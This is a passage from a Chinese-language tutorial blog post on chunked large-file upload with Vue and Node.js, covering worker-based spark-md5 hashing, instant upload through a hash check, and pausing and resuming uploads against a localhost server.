class="property">length</span>;</span><br><span class="line">        self.<span class="title function_">postMessage</span>(&#123;</span><br><span class="line">          percentage</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="comment">// 递归计算下一个切片</span></span><br><span class="line">        <span class="title function_">loadNext</span>(count);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="title function_">loadNext</span>(<span class="number">0</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>在 worker 线程中，接受文件切片 fileChunkList，利用 FileReader 读取每个切片的 ArrayBuffer 并不断传入 spark-md5 中，每计算完一个切片通过 postMessage 向主线程发送一个进度事件，全部完成后将最终的 hash 发送给主线程</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">spark-md5 需要根据所有切片才能算出一个 hash 值，不能直接将整个文件放入计算，否则即使不同文件也会有相同的 hash，具体可以看官方文档</span><br></pre></td></tr></table></figure><p><a href="https://www.npmjs.com/package/spark-md5">spark-md5</a></p><p>接着编写主线程与 worker 线程通讯的逻辑</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">+   <span class="comment">// 生成文件 hash（web-worker）</span></span><br><span class="line">+    <span class="title function_">calculateHash</span>(<span class="params">fileChunkList</span>) &#123;</span><br><span class="line">+      <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function"><span class="params">resolve</span> =&gt;</span> &#123;</span><br><span class="line">+       <span class="comment">// 添加 worker 属性</span></span><br><span class="line">+        <span class="variable language_">this</span>.<span class="property">container</span>.<span class="property">worker</span> = <span class="keyword">new</span> <span class="title class_">Worker</span>(<span class="string">&quot;/hash.js&quot;</span>);</span><br><span class="line">+        <span class="variable language_">this</span>.<span class="property">container</span>.<span class="property">worker</span>.<span class="title function_">postMessage</span>(&#123; fileChunkList &#125;);</span><br><span class="line">+        <span class="variable language_">this</span>.<span class="property">container</span>.<span class="property">worker</span>.<span class="property">onmessage</span> = <span class="function"><span class="params">e</span> =&gt;</span> &#123;</span><br><span class="line">+          <span class="keyword">const</span> &#123; percentage, hash &#125; = e.<span class="property">data</span>;</span><br><span class="line">+          <span class="variable language_">this</span>.<span class="property">hashPercentage</span> = percentage;</span><br><span class="line">+          <span class="keyword">if</span> (hash) &#123;</span><br><span class="line">+            <span class="title function_">resolve</span>(hash);</span><br><span class="line">+          &#125;</span><br><span class="line">+        &#125;;</span><br><span class="line">+      &#125;);</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="keyword">async</span> <span class="title function_">handleUpload</span>(<span class="params"></span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (!<span class="variable language_">this</span>.<span class="property">container</span>.<span class="property">file</span>) <span class="keyword">return</span>;</span><br><span class="line">      <span class="keyword">const</span> fileChunkList = <span class="variable language_">this</span>.<span class="title function_">createFileChunk</span>(<span class="variable language_">this</span>.<span class="property">container</span>.<span class="property">file</span>);</span><br><span class="line">+     <span class="variable language_">this</span>.<span class="property">container</span>.<span class="property">hash</span> = <span class="keyword">await</span> <span class="variable language_">this</span>.<span class="title function_">calculateHash</span>(fileChunkList);</span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">data</span> = fileChunkList.<span class="title function_">map</span>(<span class="function">(<span class="params">&#123; file &#125;，index</span>) =&gt;</span> (&#123;</span><br><span class="line">+       <span class="attr">fileHash</span>: <span class="variable language_">this</span>.<span class="property">container</span>.<span class="property">hash</span>,</span><br><span class="line">        <span class="attr">chunk</span>: file,</span><br><span class="line">        <span class="attr">hash</span>: <span class="variable language_">this</span>.<span class="property">container</span>.<span class="property">file</span>.<span class="property">name</span> + <span class="string">&quot;-&quot;</span> + index, <span class="comment">// 文件名 + 数组下标</span></span><br><span class="line">        <span class="attr">percentage</span>:<span class="number">0</span></span><br><span class="line">      &#125;));</span><br><span class="line">      <span class="keyword">await</span> <span class="variable language_">this</span>.<span class="title function_">uploadChunks</span>();</span><br><span class="line">    &#125;   </span><br></pre></td></tr></table></figure><p>主线程使用 <code>postMessage</code> 给 worker 线程传入所有切片 fileChunkList，并监听 worker 线程发出的 postMessage 事件拿到文件 hash</p><p>加上显示计算 hash 的进度条，看起来像这样</p><p><img src="https://user-gold-cdn.xitu.io/2020/1/8/16f84ae4f233e891?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="img"></p><p>至此前端需要将之前用文件名作为 hash 的地方改写为 workder 返回的这个 hash</p><p><img src="https://user-gold-cdn.xitu.io/2020/1/8/16f84b3bba953304?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="img"></p><p>服务端则使用 hash 作为切片文件夹名，hash + 下标作为切片名，hash + 扩展名作为文件名，没有新增的逻辑</p><p><img src="https://user-gold-cdn.xitu.io/2020/1/8/16f84b50117e4db2?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="img"></p><p><img src="https://user-gold-cdn.xitu.io/2020/1/8/16f84b33bbceaa48?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="img"></p><h2 id="文件秒传"><a href="#文件秒传" class="headerlink" title="文件秒传"></a>文件秒传</h2><p>在实现断点续传前先简单介绍一下文件秒传</p><p>所谓的文件秒传，即在服务端已经存在了上传的资源，所以当用户<code>再次上传</code>时会直接提示上传成功</p><p>文件秒传需要依赖上一步生成的 hash，即在<code>上传前</code>，先计算出文件 hash，并把 hash 发送给服务端进行验证，由于 hash 的唯一性，所以一旦服务端能找到 hash 相同的文件，则直接返回上传成功的信息即可</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">+    <span class="keyword">async</span> <span class="title function_">verifyUpload</span>(<span class="params">filename, fileHash</span>) &#123;</span><br><span class="line">+       <span class="keyword">const</span> &#123; data &#125; = <span class="keyword">await</span> <span class="variable language_">this</span>.<span class="title function_">request</span>(&#123;</span><br><span class="line">+         <span class="attr">url</span>: <span class="string">&quot;http://localhost:3000/verify&quot;</span>,</span><br><span class="line">+         <span class="attr">headers</span>: &#123;</span><br><span class="line">+           <span class="string">&quot;content-type&quot;</span>: <span class="string">&quot;application/json&quot;</span></span><br><span class="line">+         &#125;,</span><br><span class="line">+         <span class="attr">data</span>: <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123;</span><br><span class="line">+           filename,</span><br><span class="line">+           fileHash</span><br><span class="line">+         &#125;)</span><br><span class="line">+       &#125;);</span><br><span class="line">+       <span class="keyword">return</span> <span class="title class_">JSON</span>.<span class="title function_">parse</span>(data);</span><br><span class="line">+     &#125;,</span><br><span class="line">   <span class="keyword">async</span> <span class="title function_">handleUpload</span>(<span class="params"></span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (!<span class="variable language_">this</span>.<span class="property">container</span>.<span class="property">file</span>) <span class="keyword">return</span>;</span><br><span class="line">      <span class="keyword">const</span> fileChunkList = <span class="variable language_">this</span>.<span class="title function_">createFileChunk</span>(<span class="variable language_">this</span>.<span class="property">container</span>.<span class="property">file</span>);</span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">container</span>.<span class="property">hash</span> = <span class="keyword">await</span> <span class="variable language_">this</span>.<span class="title function_">calculateHash</span>(fileChunkList);</span><br><span class="line">+     <span class="keyword">const</span> &#123; shouldUpload &#125; = <span class="keyword">await</span> <span class="variable language_">this</span>.<span class="title function_">verifyUpload</span>(</span><br><span class="line">+       <span class="variable language_">this</span>.<span class="property">container</span>.<span class="property">file</span>.<span class="property">name</span>,</span><br><span class="line">+       <span class="variable language_">this</span>.<span class="property">container</span>.<span class="property">hash</span></span><br><span class="line">+     );</span><br><span class="line">+     <span class="keyword">if</span> (!shouldUpload) &#123;</span><br><span class="line">+       <span class="variable language_">this</span>.<span class="property">$message</span>.<span class="title function_">success</span>(<span class="string">&quot;秒传：上传成功&quot;</span>);</span><br><span class="line">+       <span class="keyword">return</span>;</span><br><span class="line">+    &#125;</span><br><span class="line">     <span class="variable language_">this</span>.<span class="property">data</span> = fileChunkList.<span class="title function_">map</span>(<span class="function">(<span class="params">&#123; file &#125;, index</span>) =&gt;</span> (&#123;</span><br><span class="line">        <span class="attr">fileHash</span>: <span class="variable language_">this</span>.<span class="property">container</span>.<span class="property">hash</span>,</span><br><span class="line">        index,</span><br><span class="line">        <span class="attr">hash</span>: <span class="variable language_">this</span>.<span class="property">container</span>.<span class="property">hash</span> + <span class="string">&quot;-&quot;</span> + index,</span><br><span class="line">        <span class="attr">chunk</span>: file,</span><br><span class="line">        <span class="attr">percentage</span>: <span class="number">0</span></span><br><span class="line">      &#125;));</span><br><span class="line">      <span class="keyword">await</span> <span class="variable language_">this</span>.<span class="title function_">uploadChunks</span>();</span><br><span class="line">    &#125;   </span><br></pre></td></tr></table></figure><p>秒传其实就是给用户看的障眼法，实质上根本没有上传</p><p><img src="https://user-gold-cdn.xitu.io/2020/1/9/16f890e5967106c6?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="image-20200109143511277"></p><p>:)</p><p>服务端的逻辑非常简单，新增一个验证接口，验证文件是否存在即可</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">+ <span class="keyword">const</span> <span class="title function_">extractExt</span> = filename =&gt;</span><br><span class="line">+  filename.<span class="title function_">slice</span>(filename.<span class="title function_">lastIndexOf</span>(<span class="string">&quot;.&quot;</span>), filename.<span class="property">length</span>); <span class="comment">// 提取后缀名</span></span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">UPLOAD_DIR</span> = path.<span class="title function_">resolve</span>(__dirname, <span class="string">&quot;..&quot;</span>, <span class="string">&quot;target&quot;</span>); <span class="comment">// 大文件存储目录</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">resolvePost</span> = req =&gt;</span><br><span class="line">  <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function"><span class="params">resolve</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> chunk = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    req.<span class="title function_">on</span>(<span class="string">&quot;data&quot;</span>, <span class="function"><span class="params">data</span> =&gt;</span> &#123;</span><br><span class="line">      chunk += data;</span><br><span class="line">    &#125;);</span><br><span class="line">    req.<span class="title function_">on</span>(<span class="string">&quot;end&quot;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">      <span class="title function_">resolve</span>(<span class="title class_">JSON</span>.<span class="title function_">parse</span>(chunk));</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">server.<span class="title function_">on</span>(<span class="string">&quot;request&quot;</span>, <span class="keyword">async</span> (req, res) =&gt; &#123;</span><br><span class="line">  <span class="keyword">if</span> (req.<span class="property">url</span> === <span class="string">&quot;/verify&quot;</span>) &#123;</span><br><span class="line">+    <span class="keyword">const</span> data = <span class="keyword">await</span> <span class="title function_">resolvePost</span>(req);</span><br><span class="line">+    <span class="keyword">const</span> &#123; fileHash, filename &#125; = data;</span><br><span class="line">+    <span class="keyword">const</span> ext = <span class="title function_">extractExt</span>(filename);</span><br><span class="line">+    <span class="keyword">const</span> filePath = path.<span class="title function_">resolve</span>(<span class="variable constant_">UPLOAD_DIR</span>, <span class="string">`<span class="subst">$&#123;fileHash&#125;</span><span class="subst">$&#123;ext&#125;</span>`</span>);</span><br><span class="line">+    <span class="keyword">if</span> (fse.<span class="title function_">existsSync</span>(filePath)) &#123;</span><br><span class="line">+      res.<span class="title function_">end</span>(</span><br><span class="line">+        <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123;</span><br><span class="line">+          <span class="attr">shouldUpload</span>: <span class="literal">false</span></span><br><span class="line">+        &#125;)</span><br><span class="line">+      );</span><br><span class="line">+    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">+      res.<span class="title function_">end</span>(</span><br><span class="line">+        <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123;</span><br><span class="line">+          <span class="attr">shouldUpload</span>: <span class="literal">true</span></span><br><span class="line">+        &#125;)</span><br><span class="line">+      );</span><br><span class="line">+    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line">server.<span class="title function_">listen</span>(<span class="number">3000</span>, <span class="function">() =&gt;</span> <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;正在监听 3000 端口&quot;</span>));</span><br></pre></td></tr></table></figure><h2 id="暂停上传"><a href="#暂停上传" class="headerlink" title="暂停上传"></a>暂停上传</h2><p>讲完了生成 hash 和文件秒传，回到断点续传</p><p>断点续传顾名思义即断点 + 续传，所以我们第一步先实现“断点”，也就是暂停上传</p><p>原理是使用 XMLHttpRequest 的 <code>abort</code> 方法，可以取消一个 xhr 请求的发送，为此我们需要将上传每个切片的 xhr 对象保存起来，我们再改造一下 request 方法</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">   <span class="title function_">request</span>(<span class="params">&#123;</span></span><br><span class="line"><span class="params">      url,</span></span><br><span class="line"><span class="params">      method = <span class="string">&quot;post&quot;</span>,</span></span><br><span class="line"><span class="params">      data,</span></span><br><span class="line"><span class="params">      headers = &#123;&#125;,</span></span><br><span class="line"><span class="params">      onProgress = e =&gt; e,</span></span><br><span class="line"><span class="params">+     requestList</span></span><br><span class="line"><span class="params">    &#125;</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function"><span class="params">resolve</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">        xhr.<span class="property">upload</span>.<span class="property">onprogress</span> = onProgress;</span><br><span class="line">        xhr.<span class="title function_">open</span>(method, url);</span><br><span class="line">        <span class="title class_">Object</span>.<span class="title function_">keys</span>(headers).<span class="title function_">forEach</span>(<span class="function"><span class="params">key</span> =&gt;</span></span><br><span class="line">          xhr.<span class="title function_">setRequestHeader</span>(key, headers[key])</span><br><span class="line">        );</span><br><span class="line">        xhr.<span class="title function_">send</span>(data);</span><br><span class="line">        xhr.<span class="property">onload</span> = <span class="function"><span class="params">e</span> =&gt;</span> &#123;</span><br><span class="line">+          <span class="comment">// 将请求成功的 xhr 从列表中删除</span></span><br><span class="line">+          <span class="keyword">if</span> (requestList) &#123;</span><br><span class="line">+            <span class="keyword">const</span> xhrIndex = requestList.<span class="title function_">findIndex</span>(<span class="function"><span class="params">item</span> =&gt;</span> item === xhr);</span><br><span class="line">+            requestList.<span class="title function_">splice</span>(xhrIndex, <span class="number">1</span>);</span><br><span class="line">+          &#125;</span><br><span class="line">          <span class="title function_">resolve</span>(&#123;</span><br><span class="line">            <span class="attr">data</span>: e.<span class="property">target</span>.<span class="property">response</span></span><br><span class="line">          &#125;);</span><br><span class="line">        &#125;;</span><br><span class="line">+        <span class="comment">// 暴露当前 xhr 给外部</span></span><br><span class="line">+        requestList?.<span class="title function_">push</span>(xhr);</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125;,</span><br></pre></td></tr></table></figure><p>这样在上传切片时传入 requestList 数组作为参数，request 方法就会将所有的 xhr 保存在数组中了</p><p><img src="https://user-gold-cdn.xitu.io/2020/1/8/16f8563491ea7793?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="img"></p><p>每当一个切片上传成功时，将对应的 xhr 从 requestList 中删除，所以 requestList 中只保存<code>正在上传切片的 xhr</code></p><p>之后新建一个暂停按钮，当点击按钮时，调用保存在 requestList 中 xhr 的 abort 方法，即取消并清空所有正在上传的切片</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"> <span class="title function_">handlePause</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">requestList</span>.<span class="title function_">forEach</span>(<span class="function"><span class="params">xhr</span> =&gt;</span> xhr?.<span class="title function_">abort</span>());</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">requestList</span> = [];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://user-gold-cdn.xitu.io/2020/1/9/16f890e598dd6afb?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="image-20200109143737924"></p><p>点击暂停按钮可以看到 xhr 都被取消了</p><p><img src="https://user-gold-cdn.xitu.io/2020/1/8/16f85644dc27459e?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="img"></p><h2 id="恢复上传"><a href="#恢复上传" class="headerlink" title="恢复上传"></a>恢复上传</h2><p>之前在介绍断点续传的时提到使用第二种服务端存储的方式实现续传</p><p>由于当文件切片上传后，服务端会建立一个文件夹存储所有上传的切片，所以每次前端上传前可以调用一个接口，服务端将已上传的切片的切片名返回，前端再跳过这些已经上传切片，这样就实现了“续传”的效果</p><p>而这个接口可以和之前秒传的验证接口合并，前端每次上传前发送一个验证的请求，返回两种结果</p><ul><li>服务端已存在该文件，不需要再次上传</li><li>服务端不存在该文件或者已上传部分文件切片，通知前端进行上传，并把<strong>已上传</strong>的文件切片返回给前端</li></ul><p>所以我们改造一下之前文件秒传的服务端验证接口</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">extractExt</span> = filename =&gt;</span><br><span class="line">  filename.<span class="title function_">slice</span>(filename.<span class="title function_">lastIndexOf</span>(<span class="string">&quot;.&quot;</span>), filename.<span class="property">length</span>); <span class="comment">// 提取后缀名</span></span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">UPLOAD_DIR</span> = path.<span class="title function_">resolve</span>(__dirname, <span class="string">&quot;..&quot;</span>, <span class="string">&quot;target&quot;</span>); <span class="comment">// 大文件存储目录</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">resolvePost</span> = req =&gt;</span><br><span class="line">  <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function"><span class="params">resolve</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> chunk = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    req.<span class="title function_">on</span>(<span class="string">&quot;data&quot;</span>, <span class="function"><span class="params">data</span> =&gt;</span> &#123;</span><br><span class="line">      chunk += data;</span><br><span class="line">    &#125;);</span><br><span class="line">    req.<span class="title function_">on</span>(<span class="string">&quot;end&quot;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">      <span class="title function_">resolve</span>(<span class="title class_">JSON</span>.<span class="title function_">parse</span>(chunk));</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;);</span><br><span class="line">  </span><br><span class="line">+  <span class="comment">// 返回已经上传切片名列表</span></span><br><span class="line">+ <span class="keyword">const</span> <span class="title function_">createUploadedList</span> = <span class="keyword">async</span> fileHash =&gt;</span><br><span class="line">+   fse.<span class="title function_">existsSync</span>(path.<span class="title function_">resolve</span>(<span class="variable constant_">UPLOAD_DIR</span>, fileHash))</span><br><span class="line">+    ? <span class="keyword">await</span> fse.<span class="title function_">readdir</span>(path.<span class="title function_">resolve</span>(<span class="variable constant_">UPLOAD_DIR</span>, fileHash))</span><br><span class="line">+    : [];</span><br><span class="line"></span><br><span class="line">server.<span class="title function_">on</span>(<span class="string">&quot;request&quot;</span>, <span class="keyword">async</span> (req, res) =&gt; &#123;</span><br><span class="line">  <span class="keyword">if</span> (req.<span class="property">url</span> === <span class="string">&quot;/verify&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> data = <span class="keyword">await</span> <span class="title function_">resolvePost</span>(req);</span><br><span class="line">    <span class="keyword">const</span> &#123; fileHash, filename &#125; = data;</span><br><span class="line">    <span class="keyword">const</span> ext = <span class="title function_">extractExt</span>(filename);</span><br><span class="line">    <span class="keyword">const</span> filePath = path.<span class="title function_">resolve</span>(<span class="variable constant_">UPLOAD_DIR</span>, <span class="string">`<span class="subst">$&#123;fileHash&#125;</span><span class="subst">$&#123;ext&#125;</span>`</span>);</span><br><span class="line">    <span class="keyword">if</span> (fse.<span class="title function_">existsSync</span>(filePath)) &#123;</span><br><span class="line">      res.<span class="title function_">end</span>(</span><br><span class="line">        <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123;</span><br><span class="line">          <span class="attr">shouldUpload</span>: <span class="literal">false</span></span><br><span class="line">        &#125;)</span><br><span class="line">      );</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      res.<span class="title function_">end</span>(</span><br><span class="line">        <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123;</span><br><span class="line">          <span class="attr">shouldUpload</span>: <span class="literal">true</span>，</span><br><span class="line">+         <span class="attr">uploadedList</span>: <span class="keyword">await</span> <span class="title function_">createUploadedList</span>(fileHash)</span><br><span class="line">        &#125;)</span><br><span class="line">      );</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line">server.<span class="title function_">listen</span>(<span class="number">3000</span>, <span class="function">() =&gt;</span> <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;正在监听 3000 端口&quot;</span>));</span><br></pre></td></tr></table></figure><p>接着回到前端，前端有两个地方需要调用验证的接口</p><ul><li>点击上传时，检查是否需要上传和已上传的切片</li><li>点击暂停后的恢复上传，返回已上传的切片</li></ul><p>新增恢复按钮并改造原来上传切片的逻辑</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">input</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">        <span class="attr">type</span>=<span class="string">&quot;file&quot;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">        @<span class="attr">change</span>=<span class="string">&quot;handleFileChange&quot;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">      /&gt;</span></span></span><br><span class="line"><span class="language-xml">       <span class="tag">&lt;<span class="name">el-button</span> @<span class="attr">click</span>=<span class="string">&quot;handleUpload&quot;</span>&gt;</span>上传<span class="tag">&lt;/<span class="name">el-button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">       <span class="tag">&lt;<span class="name">el-button</span> @<span class="attr">click</span>=<span class="string">&quot;handlePause&quot;</span> <span class="attr">v-if</span>=<span class="string">&quot;isPaused&quot;</span>&gt;</span>暂停<span class="tag">&lt;/<span class="name">el-button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">+      <span class="tag">&lt;<span class="name">el-button</span> @<span class="attr">click</span>=<span class="string">&quot;handleResume&quot;</span> <span class="attr">v-else</span>&gt;</span>恢复<span class="tag">&lt;/<span class="name">el-button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      //...</span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">+   <span class="keyword">async</span> <span class="title function_">handleResume</span>(<span class="params"></span>) &#123;</span><br><span class="line">+      <span class="keyword">const</span> &#123; uploadedList &#125; = <span class="keyword">await</span> <span class="variable language_">this</span>.<span class="title function_">verifyUpload</span>(</span><br><span class="line">+        <span class="variable language_">this</span>.<span class="property">container</span>.<span class="property">file</span>.<span class="property">name</span>,</span><br><span class="line">+        <span class="variable language_">this</span>.<span class="property">container</span>.<span class="property">hash</span></span><br><span class="line">+      );</span><br><span class="line">+      <span class="keyword">await</span> <span class="variable language_">this</span>.<span class="title function_">uploadChunks</span>(uploadedList);</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="keyword">async</span> <span class="title function_">handleUpload</span>(<span class="params"></span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (!<span class="variable language_">this</span>.<span class="property">container</span>.<span class="property">file</span>) <span class="keyword">return</span>;</span><br><span class="line">      <span class="keyword">const</span> fileChunkList = <span class="variable language_">this</span>.<span class="title function_">createFileChunk</span>(<span class="variable language_">this</span>.<span class="property">container</span>.<span class="property">file</span>);</span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">container</span>.<span class="property">hash</span> = <span class="keyword">await</span> 